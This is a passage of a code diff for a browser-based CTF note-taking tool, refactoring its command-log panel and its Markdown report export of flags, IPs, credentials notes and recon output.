-        const termBody = document.getElementById('terminal-body');
-        if (!termBody) return;
-
-        const logs = getTerminalLogs();
-
-        if (logs.length === 0) {
-            termBody.innerHTML = `<div class="term-line term-sys">[SYSTEM] Command log initialized.</div>`;
-            return;
-        }
-
-        termBody.innerHTML = '';
-        logs.forEach(item => {
+    function renderLogs() {
+        if (!terminalBody) return;
+        terminalBody.innerHTML = '<div class="term-line term-sys">[SYSTEM] Command log initialized. Type commands below to keep track of execution history.</div>';
+        commandLogs.forEach(cmd => {
             const line = document.createElement('div');
             line.className = 'term-line';
-            line.innerHTML = `<span class="term-time">[${item.time}]</span> <span class="term-prompt-text">user@ctf:~$</span> <span class="term-cmd">${escapeHtml(item.cmd)}</span>`;
-            termBody.appendChild(line);
+            line.innerHTML = `<span class="term-prompt-text">user@ctf-box:~$</span> <span class="term-cmd">${escapeHtml(cmd)}</span>`;
+            terminalBody.appendChild(line);
         });
+        terminalBody.scrollTop = terminalBody.scrollHeight;
+    }
+    renderLogs();
 
-        termBody.scrollTop = termBody.scrollHeight;
+    function logCommand() {
+        if (!terminalInput) return;
+        const val = terminalInput.value.trim();
+        if (val !== '') {
+            commandLogs.push(val);
+            localStorage.setItem('ctf_terminal_logs', JSON.stringify(commandLogs));
+            terminalInput.value = '';
+            renderLogs();
+        }
     }
 
-    function addCommandLog() {
-        const input = document.getElementById('terminal-input');
-        if (!input) return;
-
-        const cmdText = input.value.trim();
-        if (!cmdText) return;
-
-        const logs = getTerminalLogs();
-        const timeStr = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-
-        logs.push({ time: timeStr, cmd: cmdText });
-        localStorage.setItem('terminal_command_logs', JSON.stringify(logs));
-
-        input.value = '';
-        renderTerminal();
+    if (logCmdBtn) logCmdBtn.addEventListener('click', logCommand);
+    if (terminalInput) {
+        terminalInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') logCommand();
+        });
     }
 
-    document.getElementById('log-cmd-btn')?.addEventListener('click', addCommandLog);
-    document.getElementById('terminal-input')?.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') addCommandLog();
-    });
+    if (copyLogBtn) {
+        copyLogBtn.addEventListener('click', () => {
+            const textToCopy = commandLogs.join('\n');
+            navigator.clipboard.writeText(textToCopy);
+            copyLogBtn.textContent = '✅ Copied!';
+            setTimeout(() => copyLogBtn.textContent = '📋 Copy Log', 1500);
+        });
+    }
 
-    const clearLogBtn = document.getElementById('clear-log-btn');
     if (clearLogBtn) {
-        clearLogBtn.onclick = function() {
-            if (confirm("Clear terminal history?")) {
-                localStorage.removeItem('terminal_command_logs');
-                renderTerminal();
+        clearLogBtn.addEventListener('click', () => {
+            if (confirm("Clear command history log?")) {
+                commandLogs = [];
+                localStorage.removeItem('ctf_terminal_logs');
+                renderLogs();
             }
-        };
+        });
     }
 
-    document.getElementById('copy-log-btn')?.addEventListener('click', function() {
-        const logs = getTerminalLogs();
-        if (logs.length === 0) return alert("No commands logged yet.");
-        const logText = logs.map(l => `[${l.time}] user@ctf:~$ ${l.cmd}`).join('\n');
-        navigator.clipboard.writeText(logText);
-        alert("Copied command history to clipboard!");
-    });
+    // --- Export Markdown Report ---
+    const exportBtn = document.getElementById('export-btn');
+    if (exportBtn) {
+        exportBtn.addEventListener('click', () => {
+            const roomName = document.getElementById('room-name')?.value || 'CTF Room';
+            const roomUrl = document.getElementById('room-url')?.value || 'N/A';
+            const targetIp = document.getElementById('target-ip')?.value || 'N/A';
+            const attackerIp = document.getElementById('attacker-ip')?.value || 'N/A';
+            const userFlag = document.getElementById('user-flag')?.value || 'Pending';
+            const rootFlag = document.getElementById('root-flag')?.value || 'Pending';
+            const credsNotes = document.getElementById('creds-notes')?.value || 'None';
+            const reconOutput = document.getElementById('recon-output')?.value || 'No scans recorded.';
+            const customNotes = document.getElementById('custom-notes')?.value || 'No notes.';
 
-    renderTerminal();
+            let activePorts = [];
+            portButtons.forEach(btn => {
+                if (btn.classList.contains('active')) activePorts.push(btn.getAttribute('data-port'));
+            });
 
-    // --- Markdown Writeup Export ---
-    document.getElementById('export-btn')?.addEventListener('click', function() {
-        const roomName = document.getElementById('room-name')?.value.trim() || 'CTF Box';
-        const roomUrl = document.getElementById('room-url')?.value.trim() || 'N/A';
-        const targetIp = document.getElementById('target-ip')?.value || 'N/A';
-        const attackerIp = document.getElementById('attacker-ip')?.value || 'N/A';
-        const userFlag = document.getElementById('user-flag')?.value || 'N/A';
-        const rootFlag = document.getElementById('root-flag')?.value || 'N/A';
-        const creds = document.getElementById('creds-notes')?.value || 'None';
-        const recon = document.getElementById('recon-output')?.value || 'None';
-        const notes = document.getElementById('custom-notes')?.value || 'None';
+            let checklistMd = '';
+            for (let i = 1; i <= 10; i++) {
+                const box = document.getElementById(`step-${i}`);
+                const labelText = box?.parentElement?.textContent?.trim() || `Step ${i}`;
+                const checked = box?.checked ? '[x]' : '[ ]';
+                checklistMd += `- ${checked} ${labelText}\n`;
+            }
 
-        const activePorts = JSON.parse(localStorage.getItem('active_ports') || '[]');
+            const mdContent = `# CTF Report: ${roomName}
 
-        const markdownContent = `# 🎯 CTF Writeup / Notes: ${roomName}\n\n**Room Link:** ${roomUrl}\n**Target IP:** \`${targetIp}\`\n**Attacker IP:** \`${attackerIp}\`\n**Discovered Ports:** \`${activePorts.join(', ') || 'None'}\`\n**Date:** ${new Date().toLocaleDateString()}\n\n---\n\n## 🚩 Flags\n- **User Flag:** \`${userFlag}\`\n- **Root Flag:** \`${rootFlag}\`\n\n---\n\n## 👤 Credentials & Loot\n\`\`\`text\n${creds}\n\`\`\`\n\n---\n\n## 🔍 Recon Output\n\`\`\`text\n${recon}\n\`\`\`\n\n---\n\n## 💻 Notes & Walkthrough\n${notes}\n`;
+## 📋 Overview
+- **Room URL:** ${roomUrl}
+- **Target IP:** ${targetIp}
+- **Attacker IP:** ${attackerIp}
 
-        const blob = new Blob([markdownContent], { type: 'text/markdown' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        
-        const cleanName = roomName.replace(/[^a-zA-Z0-9.-]/g, '_');
-        a.download = `CTF_Notes_${cleanName}.md`;
-        
-        a.click();
-        URL.revokeObjectURL(url);
-    });
+## 🚩 Flags
+- **User Flag:** \`${userFlag}\`
+- **Root Flag:** \`${rootFlag}\`
+
+## 🔌 Open Ports & Services
+${activePorts.length > 0 ? activePorts.map(p => `- ${p}`).join('\n') : '- None recorded'}
+
+## 👤 Credentials & Users
+\`\`\`text
+${credsNotes}
+\`\`\`
+
+## 📋 Methodology Checklist
+${checklistMd}
+
+## 🔍 Nmap & Recon Output
+\`\`\`text
+${reconOutput}
+\`\`\`
+
+## 💻 Custom Scripts & Notes
+\`\`\`text
+${customNotes}
+\`\`\`
+
+## 🐚 Command Log History
+\`\`\`text
+${commandLogs.join('\n')}
+\`\`\`
+`;
+
+            const blob = new Blob([mdContent], { type: 'text/markdown' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `${roomName.replace(/[^a-z0-9]/gi, '_').toLowerCase()}_report.md`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        });
+    }
 
 });
